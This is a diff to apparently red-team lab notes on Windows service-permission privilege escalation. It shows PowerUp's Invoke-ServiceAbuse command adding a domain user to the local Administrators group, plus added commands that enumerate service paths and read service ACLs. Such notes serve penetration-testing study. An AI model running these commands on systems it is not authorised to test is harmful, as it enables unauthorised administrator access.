@@ -65,9 +65,26 @@ Get-ModifiableService -Verbose
 Add domain user to the local Administrators group
 
 ```powershell
+# Get help commands
+help Invoke-ServiceAbuse -Examples
+# Practical use
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
 # Verify if the above command worked or not with
 net localgroup administrators  
+```
+{% endtab %}
+
+{% tab title="PowerShell" %}
+Get all the service path names from where the service is executing.
+
+```powershell
+Get-WmiObject -Class win32_service | select pathname
+```
+
+Get ACLs of running service
+
+```powershell
+sc.exe sdshow <servicename>
 ```
 {% endtab %}
 {% endtabs %}
